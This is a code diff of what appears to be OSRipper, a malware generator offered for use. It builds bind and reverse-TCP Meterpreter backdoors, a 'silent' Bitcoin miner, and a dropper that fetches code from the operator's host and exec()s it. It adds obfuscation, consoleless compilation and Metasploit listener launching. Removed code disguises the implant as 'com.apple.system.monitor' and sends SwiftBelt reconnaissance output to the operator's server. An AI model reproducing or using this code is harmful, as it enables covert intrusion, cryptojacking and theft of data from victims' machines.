-    #pprint(responses)
-
-    job_id,prevhash,coinb1,coinb2,merkle_branch,version,nbits,ntime,clean_jobs \
-        = responses[0]['params']
-
-    #target https://bitcoin.stackexchange.com/a/36228/44319
-    target = (nbits[2:]+'00'*(int(nbits[:2],16) - 3)).zfill(64)
-    #print('nbits:{} target:{}\n'.format(nbits,target))
-
-    extranonce2 = '00'*extranonce2_size
-
-    coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
-    coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
-
-    #print('coinbase:\n{}\n\ncoinbase hash:{}\n'.format(coinbase,binascii.hexlify(coinbase_hash_bin)))
-    merkle_root = coinbase_hash_bin
-    for h in merkle_branch:
-        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
-
-    merkle_root = binascii.hexlify(merkle_root).decode()
-
-    #little endian
-    merkle_root = ''.join([merkle_root[i]+merkle_root[i+1] for i in range(0,len(merkle_root),2)][::-1])
-
-    #print('merkle_root:{}\n'.format(merkle_root))
-
-    blockheader = version + prevhash + merkle_root + nbits + ntime + nonce +\
-        '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
-
-    #print('blockheader:\n{}\n'.format(blockheader))
-
-    hash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
-    hash = binascii.hexlify(hash).decode()
-    #print('hash: {}'.format(hash))
-
-    if hash < target :
-        #print('success!!')
-        payload = '{"params": ["'+address+'", "'+job_id+'", "'+extranonce2 \
-            +'", "'+ntime+'", "'+nonce+'"], "id": 1, "method": "mining.submit"}\n'
-        sock.sendall(payload)
-        #print(sock.recv(1024))
-    else:
+    address = "{btc_address}"
+    nonce = hex(random.randint(0, 2**32-1))[2:].zfill(8)
+    
+    host = 'solo.ckpool.org'
+    port = 3333
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host, port))
+        
+        # Server connection
+        sock.sendall(b'{{"id": 1, "method": "mining.subscribe", "params": []}}\n')
+        lines = sock.recv(1024).decode().split('\n')
+        response = json.loads(lines[0])
+        sub_details, extranonce1, extranonce2_size = response['result']
+        
+        # Authorize worker
+        auth_msg = f'{{"params": ["{btc_address}", "password"], "id": 2, "method": "mining.authorize"}}\n'
+        sock.sendall(auth_msg.encode())
+        
+        # Mining loop
+        response = b''
+        while response.count(b'\n') < 4 and not(b'mining.notify' in response):
+            response += sock.recv(1024)
+        
+        responses = [json.loads(res) for res in response.decode().split('\n') 
+                    if len(res.strip()) > 0 and 'mining.notify' in res]
+        
+        if responses:
+            job_id, prevhash, coinb1, coinb2, merkle_branch, version, nbits, ntime, clean_jobs = responses[0]['params']
+            
+            # Calculate target and mine
+            target = (nbits[2:] + '00' * (int(nbits[:2], 16) - 3)).zfill(64)
+            extranonce2 = '00' * extranonce2_size
+            
+            coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
+            coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
+            
+            merkle_root = coinbase_hash_bin
+            for h in merkle_branch:
+                merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
+            
+            merkle_root = binascii.hexlify(merkle_root).decode()
+            merkle_root = ''.join([merkle_root[i:i+2] for i in range(0, len(merkle_root), 2)][::-1])
+            
+            blockheader = version + prevhash + merkle_root + nbits + ntime + nonce + \
+                '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
+            
+            hash_result = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
+            hash_hex = binascii.hexlify(hash_result).decode()
+            
+            if hash_hex < target:
+                payload = f'{{"params": ["{btc_address}", "{job_id}", "{extranonce2}", "{ntime}", "{nonce}"], "id": 1, "method": "mining.submit"}}\n'
+                sock.sendall(payload.encode())
+        
+        sock.close()
+        
+    except Exception:
+        time.sleep(10)
         main()
 
-    sock.close()
-main()
-
-"""
-        ina.write(b)
-
+if __name__ == "__main__":
+    while True:
+        main()
+'''
+    
+    with open(name, 'w') as f:
+        f.write(miner_code)
+    
+    print(f"✅ BTC miner generated: {name}")
+    print(f"💰 Payout address: {btc_address}")
+    print("📊 Monitor at: https://solo.ckpool.org/")
 
 def postgen():
-    opt_obf = input(
-        "Do you want to obfuscate the generated programm (recommended) (y/n): "
-    )
+    """Handle post-generation options."""
     global encrypted
-    encrypted = False
-    b = "".join(
-        secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-        for i in range(13)
-    )
-    if opt_obf == "y":
-        encrypted = True
-        import obfuscator
+    
+    print("\n🔧 Post-Generation Options")
+    print("─" * 30)
+    
+    # Obfuscation
+    obfuscate = get_user_input(
+        "Obfuscate payload? (recommended) (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
+    
+    if obfuscate:
+        try:
+            import obfuscator
+            encrypted = True
+            obfuscator.MainMenu(name)
+            print("✅ Payload obfuscated successfully")
+        except Exception as e:
+            print(f"❌ Obfuscation failed: {e}")
+    
+    # Compilation
+    compile_binary = get_user_input(
+        "Compile to binary? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
+    
+    if compile_binary:
+        compile_payload()
 
-        obfuscator.MainMenu(name)
-    compiling = input(
-        "Do you want to compile the script into a binary (might require sudo) (y/n): "
-    )
-    if compiling == "y":
-        global icochoice
-        icochoice = input(
-            "Enter .ico path to set a custom icon (press enter for default): "
-        )
-        if encrypted == True:
-            if icochoice:
-                compcomd = (
-                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon="
-                    + icochoice
-                    + " --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
-                    + name
-                    + "_or.py"
-                )
-                os.system(compcomd)
-                print('Saved under "dist" folder')
-            else:
-                compcomd = (
-                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
-                    + name
-                    + "_or.py"
-                )
-                os.system(compcomd)
-                print('Saved under "dist" folder')
-
+def compile_payload():
+    """Compile payload to binary."""
+    try:
+        os.makedirs("dist", exist_ok=True)
+        
+        icon_path = input("Enter .ico path for custom icon (or press Enter for default): ").strip()
+        source_file = f"{name}_or.py" if encrypted else f"{name}.py"
+        
+        cmd_parts = [
+            "python3", "-m", "nuitka",
+            "--standalone",
+            "--include-module=sandboxed",
+            "--disable-console",
+            "--windows-disable-console",
+            "--onefile",
+            "--assume-yes-for-downloads"
+        ]
+        
+        if platform.system() == "Darwin":
+            cmd_parts.append("--macos-create-app-bundle")
+            if icon_path and os.path.exists(icon_path):
+                cmd_parts.append(f"--macos-onefile-icon={icon_path}")
+        
+        if icon_path and os.path.exists(icon_path) and platform.system() != "Darwin":
+            cmd_parts.append(f"--windows-icon-from-ico={icon_path}")
+        
+        cmd_parts.append(source_file)
+        
+        print("🔨 Compiling payload...")
+        result = subprocess.run(cmd_parts, capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            print("✅ Compilation successful!")
+            print("📁 Binary saved in: dist/")
         else:
-            if icochoice:
-                compcomd = (
-                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon="
-                    + icochoice
-                    + " --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
-                    + name
-                )
-                os.system(compcomd)
-                print('Saved under "dist" folder')
-            else:
-                compcomd = (
-                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
-                    + name
-                )
-                os.system(compcomd)
-                print('Saved under "dist" folder')
-            print(logo)
-            print('Backdoor saved under "dist" folder')
+            print("❌ Compilation failed")
+            print(f"Error: {result.stderr}")
+            
+    except Exception as e:
+        print(f"❌ Compilation error: {e}")
 
 def start_web_server(webroot):
-    command = ["python3", "-m", "http.server", "--directory", webroot]
-
-    # Start the web server as a background process
-    subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-
-def rep_syst():
-    hide = input(
-        "Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux (aarch64) only and doesnt support ngrok) (y/n): "
-    )
-    if hide == "y":
-        global name2
-        global reps
-        reps = True
-        if bind == "1":
-            host2 = "localhost"
-        else:
-            host2 = host
-        name2 = input("Please enter the name for the rat: ")
-        icochoice = input(
-            "Enter .ico path to set a custom icon (press enter for default): "
-        )
-        with open(name2, "a+") as hider:
-            hider.write(str('host = "' + host2 + '"\n'))
-            v = """
-import os
-import shutil
-import time
-directory_path = os.getcwd()
-folder_name = os.path.basename(directory_path)
-anan= __file__
-filename = anan.split('/')
-a=anan.replace(str(filename[-1]), '')
-src1=a+'swiftbelt/Swiftbelt'
-src=a+'ocr/Contents/MacOS/ocr_or'
-dest1='/Users/Shared/swift'
-dest='/Users/Shared/com.apple.system.monitor'
-shutil.copyfile(src, dest)
-shutil.copy(src1, dest1)
-os.system('chmod u+x '+dest1)
-os.system(dest1+' > /users/shared/output.txt')
-time.sleep(10)
-
-import socket
-import sys
-
-
-ServerIp = host
-
-
-
-# Now we can create socket object
-s = socket.socket()
-
-# Lets choose one port and connect to that port
-PORT = 9898
-
-# Lets connect to that port where server may be running
-s.connect((ServerIp, PORT))
-
-# We can send file sample.txt
-file = open("/users/shared/output.txt", "rb")
-SendData = file.read(1024)
-
-
-while SendData:
-    # Now we can receive data from server
-    #Now send the content of sample.txt to server
-    s.send(SendData)
-    SendData = file.read(1024)      
-
-# Close the connection from client side
-s.close()
-#print('connection closed')
-os.system('chmod u+x '+dest)
-os.system(dest)
-
-            """
-            hider.write(v)
-            hider.close()
-            import obfuscator
-
-            obfuscator.MainMenu(name2)
-            if icochoice:
-                os.system(
-                    "sudo pyinstaller -i "
-                    + icochoice
-                    + ' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '
-                    + str(name2)
-                    + "_or.py"
-                )
-
-            else:
-                os.system(
-                    'sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '
-                    + str(name2)
-                    + "_or.py"
-                )
-
-
-def server():
-    import socket
-
-    # Now we can create socket object
-    s = socket.socket()
-
-    # Lets choose one port and start listening on that port
-    PORT = 9898
-    print("\n Server is listening on port :", PORT, "\n")
-
-    # Now we need to bind to the above port at server side
-    s.bind(("", PORT))
-
-    # Now we will put server into listenig  mode
-    s.listen(10)
-
-    # Open one recv.txt file in write mode
-    file = open("recv.txt", "wb")
-    # print("\n Copied file name will be recv.txt at server side\n")
-
-    # Now we do not know when client will concatct server so server should be listening contineously
-    while True:
-        # Now we can establish connection with clien
-        conn, addr = s.accept()
-
-        # Send a hello message to client
-        # msg = "\n\n|---------------------------------|\n Hi Client[IP address: "+ addr[0] + "], \n ֲֳ**Welcome to Server** \n -Server\n|---------------------------------|\n \n\n"
-        # conn.send(msg.encode())
-
-        # Receive any data from client side
-        RecvData = conn.recv(1024)
-        while RecvData:
-            file.write(RecvData)
-            RecvData = conn.recv(1024)
-
-        # Close the file opened at server side once copy is completed
-        file.close()
-        print("\n File has been copied successfully \n")
-
-        # Close connection with client
-        conn.close()
-        print("\n Server closed the connection \n")
-
-        # Come out from the infinite while loop as the file has been copied from client.
-        break
-
-
-def cleanup():
+    """Start web server for staged payloads."""
     try:
-        if reps == False:
-            os.remove("ocr.py")
-            os.remove("ocr_or.py")
-            os.remove("ocr_or.spec")
-        if reps == True:
-            os.remove(name2)
-            os.remove(name2 + ".spec")
-            os.remove("ocr.py")
-            os.remove("ocr_or.py")
-            os.remove("ocr_or.spec")
-            if platform.system() == "Windows":
-                shutil.rmtree(os.getcwd() + "/dist/ocr_or.exe")
-            else:
-                shutil.rmtree(os.getcwd() + "/dist/" + name2)
-    except FileNotFoundError:
-        pass
+        cmd = ["python3", "-m", "http.server", "8000", "--directory", webroot]
+        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("🌐 Web server started in background on port 8000")
+    except Exception as e:
+        print(f"❌ Failed to start web server: {e}")
 
 def webdelivery():
-    with open ("backdoor.py","a+") as outs:
-        specf="destin='http://"+host+":8000/ocr_or.py'"
-        websc= """
+    """Create web delivery dropper."""
+    with open("dropper.py", "w") as f:
+        dropper_code = f'''
 import requests
-import subprocess
 import time
 import random
-def download_and_run_script(url):
-    response = requests.get(url)
-    script_content = response.text
-    exec(script_content)
 
-script_url = destin
-download_and_run_script(script_url)
-        """
-        outs.write(specf)
-        outs.write(websc)
-    import obfuscator
-    obfuscator.MainMenu("backdoor.py")
-    os.system("python3 -m nuitka --standalone --include-module=sandboxed --disable-console --onefile --assume-yes-for-downloads backdoor_or.py")
-print(
-    """
-    
-        1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
-        2. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
-        3. Crypt custom code
-        ##########################################################################################
-                                                Miners
-        4. Create a silent BTC miner
-        ##########################################################################################
-                                            Staged Payloads
-        5. Create Encrypted Meterpreter (staged)
+def download_and_execute():
+    try:
+        url = "http://{host}:8000/{name}_or.py"
+        time.sleep(random.randint(1, 10))
         
-"""
-)
-encrypted = False
-nscan = input("Please select a module: ")
-if nscan == "1":
-    gen_bind()
-    postgen()
-    cleanup()
-    os.system("clear")
-    print("Generated in dist")
-    a = "use python/meterpreter/bind_tcp in metasploit to connect to target"
-    print(a)
-if nscan == "2":
-    clear()
-    logo()
-    print(
-        "##########################################################################################"
-    )
-    print("Generating")
-    gen_rev_ssl_tcp()
-    clear()
-    logo()
-    print(
-        "##########################################################################################"
-    )
-    print("Specifying")
-    postgen()
-    clear()
-    logo()
-    print(
-        "##########################################################################################"
-    )
-    print("RootKit")
-    rep_syst()
-    if reps == True:
-        print("Generated in dist")
-        print(
-            "OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called recv.txt with all the data that has been pulled of the target"
-        )
-        print("After that the listener will spawn instantly")
-        server()
-        print("wait...")
-        a = (
-            "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "
-            + port
-            + "; exploit'"
-        )
-        os.system(a)
-    else:
-        print("wait...")
-        a = (
-            "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "
-            + port
-            + "; exploit'"
-        )
-        os.system(a)
-if nscan == "3":
-    gen_custom()
-    postgen()
-    rep_syst()
-if nscan == "4":
-    gen_btc_miner()
-    opt_obf = input(
-        "Do you want to obfuscate the generated programm (recommended) (y/n): "
-    )
-    print(
-        "obfuscating... (might take a few minutes due to the layer based obfuscation)"
-    )
-    encrypted = False
-    if opt_obf == "y":
-        encrypted = True
-        import obfuscator
-
-        obfuscator.MainMenu(name)
-    compiling = input(
-        "Do you want to compile the script into a binary (might require sudo) (y/n): "
-    )
-    if compiling == "y":
-        if encrypted == True:
-            compcomd = (
-                "pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii "
-                + name
-                + "_or.py"
-            )
-            os.system(compcomd)
-            print('Saved under "dist" folder')
+        response = requests.get(url, timeout=30)
+        if response.status_code == 200:
+            exec(response.text)
         else:
-            compcomd = (
-                "pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii "
-                + name
-            )
-            os.system(compcomd)
-            os.system(clear)
-            print(logo)
-            print('Miner saved under "dist" folder')
-    print("You can monitor your `miners` here : https://solo.ckpool.org/")
-    cleanup()
-if nscan == "5":
-    clear()
-    logo()
-    print(
-        "##########################################################################################"
-    )
-    print("Generating")
-    gen_rev_ssl_tcp()
-    clear()
-    logo()
-    print(
-        "##########################################################################################"
-    )
+            time.sleep(300)
+            download_and_execute()
+    except Exception:
+        time.sleep(300)
+        download_and_execute()
 
+if __name__ == "__main__":
+    download_and_execute()
+'''
+        f.write(dropper_code)
+    
+    # Obfuscate dropper
+    try:
+        import obfuscator
+        obfuscator.MainMenu("dropper.py")
+    except Exception:
+        pass
+    
+    # Compile dropper
+    try:
+        subprocess.run([
+            "python3", "-m", "nuitka", "--standalone", "--include-module=sandboxed",
+            "--disable-console", "--onefile", "--assume-yes-for-downloads", "dropper_or.py"
+        ], check=True)
+    except Exception:
+        pass
 
-    b = "".join(
-        secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-        for i in range(13)
-    )
+def cleanup():
+    """Clean up temporary files."""
+    try:
+        temp_files = [f"{name}.py", f"{name}_or.py", f"{name}_or.spec", "dropper.py", "dropper_or.py", "tmp.txt"]
+        for file in temp_files:
+            if os.path.exists(file):
+                os.remove(file)
+    except Exception:
+        pass
 
-    encrypted = True
-    import obfuscator
+def start_listener():
+    """Start Metasploit listener."""
+    if not bind and host and port:
+        try:
+            print("🎯 Starting Metasploit listener...")
+            cmd = f"msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'"
+            os.system(cmd)
+        except Exception as e:
+            print(f"❌ Failed to start listener: {e}")
+            print(f"💡 Manually run: msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'")
 
-    obfuscator.MainMenu(name)
-    file_path = "ocr_or.py"
-    destination_directory = "webroot"
-    move_file_to_directory(file_path, destination_directory)
-    webdelivery()
-    webroot = "webroot"
-    start_web_server(webroot)
-    print("web server started in the beackground on port 8000. the backdoor is saved as backdoor_or.py and if you have compiled it it will be in the nuitka folder")
-    print("wait...")
-    a = (
-            "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "
-            + port
-            + "; exploit'"
+def main():
+    """Main application."""
+    try:
+        clear_screen()
+        display_logo()
+        display_menu()
+        
+        choice = get_user_input(
+            "\n🎯 Select module (1-5): ",
+            lambda x: x in ['1', '2', '3', '4', '5'],
+            "Please select a valid option (1-5)"
         )
-    os.system(a)
+        
+        print(f"\n🚀 Executing module {choice}...")
+        
+        if choice == '1':
+            gen_bind()
+            postgen()
+            cleanup()
+            print("\n💡 Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
+            
+        elif choice == '2':
+            gen_rev_ssl_tcp()
+            postgen()
+            start_listener()
+            
+        elif choice == '3':
+            gen_custom()
+            postgen()
+            
+        elif choice == '4':
+            gen_btc_miner()
+            postgen()
+            
+        elif choice == '5':
+            gen_rev_ssl_tcp()
+            postgen()
+            
+            # Move to webroot and start server
+            os.makedirs("webroot", exist_ok=True)
+            payload_file = f"{name}_or.py" if encrypted else f"{name}.py"
+            if os.path.exists(payload_file):
+                shutil.move(payload_file, f"webroot/{payload_file}")
+            
+            webdelivery()
+            start_web_server("webroot")
+            start_listener()
+        
+        print("\n✅ Operation completed successfully!")
+        print("📁 Check the 'dist' directory for your files")
+        
+    except KeyboardInterrupt:
+        print("\n\n👋 Operation cancelled by user")
+    except Exception as e:
+        print(f"\n❌ Unexpected error: {e}")
+    finally:
+        print("\n🏴‍☠️ Thanks for using OSRipper!")
 
-
-else:
-    print("Please select a vaild option")
+if __name__ == "__main__":
+    # Check Python version
+    if sys.version_info < (3, 6):
+        print("❌ Python 3.6 or higher is required")
+        sys.exit(1)
+    
+    main()
